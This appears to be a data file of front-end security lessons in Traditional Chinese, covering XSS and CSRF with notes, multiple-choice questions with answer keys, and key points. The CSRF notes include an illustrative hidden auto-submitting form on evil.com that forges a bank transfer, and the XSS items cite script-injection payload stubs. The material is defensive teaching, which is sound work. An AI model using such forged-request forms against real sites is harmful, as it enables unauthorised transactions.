          'element.innerHTML = userInput',
          'React: <div>{userInput}</div>',
        ],
        answer: 2,
        explanation: 'element.innerHTML = userInput 直接將使用者輸入作為 HTML 解析，若輸入包含 `<script>` 或 `<img onerror="...">` 等，就會執行惡意腳本。textContent 只當作純文字，不解析 HTML，是安全的。DOMPurify.sanitize() 會過濾危險內容。React 的 {userInput} 也會自動 Escape，不會解析為 HTML。',
      },
      {
        id: 4,
        question: 'Content Security Policy（CSP）如何幫助防禦 XSS？',
        options: [
          '自動將使用者輸入中的 <script> 標籤移除',
          '加密網路傳輸，防止腳本被注入',
          '透過 HTTP Header 限制瀏覽器只執行來自指定來源的腳本，阻止內聯腳本執行',
          '定期掃描資料庫中的惡意腳本並清除',
        ],
        answer: 2,
        explanation: 'CSP 透過 Content-Security-Policy HTTP Header 告訴瀏覽器：只信任指定來源的腳本。設定 script-src \'self\' 後，內聯的 <script> 標籤（inline script）和 eval() 都會被瀏覽器阻止執行，即使 XSS 成功注入了惡意腳本，CSP 也能在執行層面加以阻止，形成第二道防線。',
      },
      {
        id: 5,
        question: '為什麼 HttpOnly Cookie 可以降低 XSS 攻擊的危害？',
        options: [
          '阻止攻擊者注入惡意腳本',
          '即使 XSS 腳本執行，也無法透過 document.cookie 讀取 HttpOnly Cookie',
          '讓 Cookie 只在 HTTPS 下傳送，防止竊聽',
          '限制 Cookie 的有效期，降低被盜用的時間窗口',
        ],
        answer: 1,
        explanation: 'HttpOnly 屬性讓 Cookie 無法被 JavaScript 存取（document.cookie 看不到它）。XSS 攻擊常見目標是竊取 Cookie（特別是 Session Cookie）以劫持帳號。設定 HttpOnly 後，即使 XSS 腳本成功執行，也無法讀取 Session Cookie，大幅降低帳號被劫持的風險。注意：Secure 屬性才是限制只在 HTTPS 傳送。',
      },
      {
        id: 6,
        question: '當需要允許使用者輸入 HTML（如富文字編輯器）時，正確的處理方式是？',
        options: [
          '直接用 innerHTML 插入，因為使用者有合法需求',
          '完全禁止 HTML 輸入，一律用 textContent',
          '使用 DOMPurify 等 Sanitize 工具過濾危險內容後再插入',
          '用 JSON.stringify 序列化後再插入',
        ],
        answer: 2,
        explanation: '當確實需要富文字功能時，不能直接插入也不能完全禁止 HTML。DOMPurify 等 Sanitize Library 會解析 HTML 並移除危險元素（<script>、on* 事件屬性、javascript: 連結等），保留合法的格式標籤（<b>、<i>、<p> 等），是處理此類需求的正確方式。',
      },
      {
        id: 7,
        question: 'Reflected XSS 攻擊通常如何傳播？',
        options: [
          '透過被感染的 npm 套件在安裝時自動執行',
          '直接攻擊伺服器資料庫植入惡意腳本',
          '誘使使用者點擊包含惡意腳本的 URL，伺服器將參數原封不動反射回 HTML',
          '在使用者的瀏覽器中修改本地 Cookie',
        ],
        answer: 2,
        explanation: 'Reflected XSS 依賴社交工程：攻擊者建構一個包含惡意腳本的 URL（如 ?q=<script>...</script>），伺服器將此參數不加處理地放入 HTML 回應。攻擊者透過釣魚郵件、社群媒體等誘使受害者點擊這個 URL，受害者的瀏覽器載入頁面時即執行惡意腳本。因此 Reflected XSS 只影響點擊連結的使用者，而非所有訪客。',
      },
    ],
    keyPoints: [
      'XSS 三種類型：Stored（持久型，存資料庫，影響所有訪客）、Reflected（反射型，透過 URL 觸發）、DOM-based（純客戶端，不經過伺服器）。',
      '最基本防禦：不要用 innerHTML 插入使用者輸入，改用 textContent 或先 HTML Encode。',
      'React/Vue 的模板語法（{} / {{}}）預設會自動 Escape，使用 dangerouslySetInnerHTML / v-html 時需特別小心。',
      'CSP（Content-Security-Policy）Header 可在執行層面阻止未授權腳本執行，形成第二道防線。',
      'HttpOnly Cookie 讓 XSS 腳本無法透過 document.cookie 竊取 Session，降低帳號劫持風險。',
      '需要富文字輸入時，使用 DOMPurify 等 Sanitize Library 過濾危險標籤後再插入 DOM。',
    ],
  },

  // ─── 安全與跨域 ────────────────────────────────────────────────────────────
  {
    slug: 'csrf-attack',
    title: 'CSRF 跨站請求偽造',
    description: '了解 CSRF 如何利用使用者身份偽造請求及 CSRF Token 與 SameSite Cookie 的防禦方式',
    subCategory: '安全與跨域',
    difficulty: 'medium',
    notes: {
      sections: [
        {
          heading: 'CSRF 攻擊原理',
          content: `CSRF（Cross-Site Request Forgery）是攻擊者誘使已登入的使用者，在不知情的情況下對目標網站發送惡意請求。

**攻擊流程：**
\`\`\`
1. 使用者登入 bank.example.com，瀏覽器保存了 Cookie
2. 攻擊者誘使使用者訪問惡意網站 evil.com
3. evil.com 頁面中有隱藏的請求：
   <form action="https://bank.example.com/transfer" method="POST">
     <input name="to" value="attacker-account">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit()</script>
4. 瀏覽器自動帶上 bank.example.com 的 Cookie 發送請求
5. 伺服器以為是合法使用者操作，執行轉帳
\`\`\`

**關鍵點：** CSRF 利用的是「瀏覽器自動帶上 Cookie」的機制。攻擊者不需要知道 Cookie 的值，只要讓受害者的瀏覽器發送請求即可。`,
        },
        {
          heading: 'CSRF vs XSS 的差異',
          content: `| 特性 | CSRF | XSS |
|------|------|-----|
| 攻擊目標 | 利用使用者身份發送偽造請求 | 在使用者瀏覽器中執行惡意腳本 |
| 需要 JS 執行 | 不一定（Form 提交即可） | 是 |
| 攻擊發生位置 | 跨站（從惡意網站觸發） | 同站（在目標網站執行） |
| 竊取資料 | 難以直接竊取（受同源政策限制） | 可直接竊取（在目標網域執行） |
| HttpOnly 防禦效果 | 無效（Cookie 仍自動帶上） | 有效（JS 無法讀取 Cookie） |
| 主要防禦方式 | CSRF Token、SameSite Cookie | 輸出編碼、CSP、HttpOnly |`,
        },
        {
          heading: '防禦方式一：CSRF Token',
          content: `CSRF Token 是伺服器產生的隨機令牌，攻擊者無法預測或取得：

\`\`\`
流程：
1. 伺服器為每個 Session 或每個表單產生隨機 CSRF Token
2. 將 Token 嵌入 HTML 表單中（隱藏欄位）或放在 Cookie 中（Double Submit）
3. 前端發送請求時，必須在 Body 或 Header 中帶上 Token
4. 伺服器驗證 Token，不一致則拒絕請求
\`\`\`

\`\`\`html
<!-- 方式一：表單隱藏欄位 -->
<form method="POST" action="/transfer">
  <input type="hidden" name="_csrf" value="abc123xyz...">
  <!-- 其他欄位 -->
</form>

<!-- 方式二：Fetch 請求帶在 Header -->
<script>
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': getCsrfTokenFromMeta() },
  body: JSON.stringify({ amount: 100 })
})
</script>
\`\`\`

攻擊者從惡意網站無法讀取目標網站的 Token（受同源政策保護），因此無法偽造合法請求。`,
        },
        {
          heading: '防禦方式二：SameSite Cookie',
          content: `SameSite Cookie 是最簡便的現代 CSRF 防禦方式：

\`\`\`
Set-Cookie: sessionId=abc; SameSite=Strict; HttpOnly; Secure
\`\`\`

| SameSite 值 | CSRF 防禦效果 |
|-------------|-------------|
| Strict | 所有跨站請求都不帶 Cookie，防禦最強，但可能影響 UX（從外部連結進來需重新登入） |
| Lax | 跨站 POST 請求不帶 Cookie（防禦大多數 CSRF），跨站 GET 請求帶 Cookie |
| None | 所有跨站請求都帶 Cookie，無 CSRF 防護（需搭配 Secure） |

**現代瀏覽器已將 SameSite 預設值改為 Lax**，提供基本的 CSRF 防護。`,
        },
        {
          heading: '防禦方式三：Referer / Origin 驗證與 Double Submit Cookie',
          content: `**Referer / Origin Header 驗證：**
\`\`\`
伺服器檢查請求的 Origin 或 Referer Header 是否來自合法來源。
攻擊者從惡意網站發出的請求，Origin 會是 evil.com，伺服器可以拒絕。

缺點：
- 某些隱私工具或瀏覽器設定會移除 Referer Header
- Origin Header 在某些情況下不存在
\`\`\`

**Double Submit Cookie 模式：**
\`\`\`
1. 伺服器設定一個隨機 CSRF Token 的 Cookie（非 HttpOnly）
2. 前端 JavaScript 讀取此 Cookie 的值
3. 發送請求時，同時在 Cookie 和請求 Header/Body 帶上此 Token
4. 伺服器驗證兩個 Token 是否一致

優點：伺服器不需要儲存 Token（無狀態）
缺點：若子網域被 XSS 攻破，攻擊者可修改 Cookie 繞過防禦
\`\`\``,
        },
      ],
    },
    questions: [
      {
        id: 1,
        question: 'CSRF 攻擊的核心原理是什麼？',
        options: [
          '攻擊者在目標網站注入惡意 JavaScript 程式碼',
          '攻擊者誘使已登入的使用者的瀏覽器發送偽造請求，利用瀏覽器自動帶上 Cookie 的機制',
          '攻擊者直接竊取使用者的 Cookie 後冒用身份',
          '攻擊者透過暴力破解取得使用者密碼',
        ],
        answer: 1,
        explanation: 'CSRF 攻擊利用「瀏覽器在發送請求時會自動帶上對應網域的 Cookie」這個機制。攻擊者誘使已登入使用者的瀏覽器向目標網站發送惡意請求（如轉帳、修改密碼），由於 Cookie 自動帶上，伺服器誤以為是合法操作。攻擊者不需要知道 Cookie 的值，只需觸發請求即可。',
      },
      {
        id: 2,
        question: 'CSRF 和 XSS 最主要的差異是什麼？',
        options: [
          'CSRF 比 XSS 危險，因為不需要使用者操作',
          'XSS 是在目標網站執行惡意腳本；CSRF 是利用使用者身份從跨站發送偽造請求',
          '兩者攻擊原理完全相同，只是名稱不同',
          'CSRF 只能攻擊 GET 請求，XSS 可以攻擊所有請求',
        ],
        answer: 1,
        explanation: 'XSS 是攻擊者在目標網站的頁面中注入並執行惡意 JavaScript，可以直接讀取 Cookie、localStorage 等資料。CSRF 是攻擊者從另一個網站（evil.com）誘使受害者的瀏覽器對目標網站（bank.com）發送請求，攻擊者本身無法讀取回應（受同源政策限制），只能觸發操作。',
      },
      {
        id: 3,
        question: '為什麼 HttpOnly Cookie 對 CSRF 防禦無效，但對 XSS 防禦有效？',
        options: [
          'HttpOnly Cookie 只在 GET 請求中有效，POST 請求無法防禦',
          'CSRF 攻擊不需要讀取 Cookie 的值，只需瀏覽器自動帶上即可；XSS 需要讀取 Cookie 值',
          'HttpOnly 會完全阻止 Cookie 的傳送',
          'CSRF 攻擊使用 JavaScript 讀取 Cookie，HttpOnly 應該有效才對',
        ],
        answer: 1,
        explanation: 'HttpOnly 阻止 JavaScript 讀取 Cookie，但 Cookie 仍然會自動附加在 HTTP 請求中。CSRF 攻擊者不需要知道 Cookie 的值，只要讓受害者的瀏覽器發送請求，Cookie 就會自動帶上，所以 HttpOnly 對 CSRF 無效。XSS 攻擊需要 JS 讀取 Cookie 的值（如 document.cookie），HttpOnly 阻止了這個讀取，因此有效。',
      },
      {
        id: 4,
        question: 'CSRF Token 防禦 CSRF 攻擊的原理是什麼？',
        options: [
          '加密所有 Cookie，讓攻擊者無法使用竊取的 Cookie',
          '要求請求必須帶上只有伺服器和合法前端知道的隨機 Token，攻擊者無法從跨域讀取此 Token',
          '設定 Cookie 的有效期非常短，讓攻擊者來不及使用',
          '驗證請求的 User-Agent Header，只接受瀏覽器的請求',
        ],
        answer: 1,
        explanation: 'CSRF Token 是伺服器為每個 Session 或請求生成的隨機值，嵌入表單或由前端放在 Header 中。攻擊者從 evil.com 無法讀取 bank.com 頁面中的 Token（同源政策限制），因此無法在偽造請求中帶上正確的 Token。伺服器驗證 Token 存在且正確，才執行操作。',
      },
      {
        id: 5,
        question: 'SameSite=Lax 的 Cookie 在哪種情況下不會隨跨站請求發送？',
        options: [
          '所有跨站請求都不帶（包括點擊連結）',
          '跨站的 POST、PUT、DELETE 等非安全方法請求不帶 Cookie',
          '只有 API 的 XHR/fetch 請求不帶 Cookie，表單提交仍帶',
          '所有請求都帶，和 SameSite=None 相同',
        ],
        answer: 1,
        explanation: 'SameSite=Lax 是現代瀏覽器的預設值，對跨站請求的限制是：非安全方法（POST、PUT、DELETE 等）不帶 Cookie，可以防禦大多數 CSRF 攻擊（因為 CSRF 通常觸發 POST 請求）。但跨站的 GET 請求（如從外部網站點連結進來）仍會帶 Cookie，保留了良好的使用者體驗。',
      },
      {
        id: 6,
        question: '「Double Submit Cookie」防禦 CSRF 的方式是什麼？',
        options: [
          '要求使用者提交表單兩次以確認操作',
          '設定兩個不同的 Session Cookie，同時驗證兩者',
          '伺服器設定 CSRF Token Cookie（可被 JS 讀取），前端讀取後同時在請求 Header 中帶上，伺服器驗證兩者一致',
          '在請求中同時帶上 Cookie 和 localStorage 的資料',
        ],
        answer: 2,
        explanation: 'Double Submit Cookie 模式：伺服器設定一個隨機值的 Cookie（非 HttpOnly，讓 JS 可讀）；前端 JS 讀取此 Cookie 的值，在發送請求時同時帶在 Header（如 X-CSRF-Token）中；伺服器驗證 Cookie 中的值和 Header 中的值是否一致。攻擊者從 evil.com 無法讀取 bank.com 的 Cookie（同源政策），因此無法構造一致的兩個值。',
      },
      {
        id: 7,
        question: '以下哪個 CSRF 防禦方式是目前最推薦、最簡便的現代方案？',
        options: [
          '驗證 User-Agent Header',
          '設定 Cookie 的有效期為 1 分鐘',
          '為所有敏感操作的 Cookie 設定 SameSite=Strict 或 Lax，搭配 CSRF Token',
          '禁止使用 POST 請求，改用 GET',
        ],
        answer: 2,
        explanation: '現代 CSRF 防禦最佳實踐是雙層防禦：SameSite Cookie（Strict 或 Lax）作為第一道防線，大幅減少跨站請求帶上 Cookie；CSRF Token 作為第二道防線，驗證請求來自合法前端。兩者搭配可以有效防禦各種 CSRF 攻擊場景。驗證 User-Agent 和時間限制都很容易被繞過。',
      },
    ],
    keyPoints: [
      'CSRF 利用「瀏覽器發送請求時自動帶上 Cookie」的機制，攻擊者不需要知道 Cookie 值，只需觸發請求。',
      'XSS 在目標網站執行惡意腳本（可讀取資料）；CSRF 從跨站觸發請求（無法讀取回應）。',
      'HttpOnly Cookie 對 CSRF 無效（Cookie 仍自動帶上）；對 XSS 有效（JS 無法讀取 Cookie 值）。',
      'CSRF Token：請求必須帶上伺服器生成的隨機 Token，攻擊者因同源政策無法從跨域取得此 Token。',
      'SameSite=Strict 完全阻止跨站請求帶 Cookie；SameSite=Lax（現代瀏覽器預設）阻止跨站 POST 請求帶 Cookie。',
      'Double Submit Cookie：伺服器設定可被 JS 讀取的 CSRF Token Cookie，前端同時在 Header 帶上，伺服器驗證兩值一致。',
    ],
  },
]
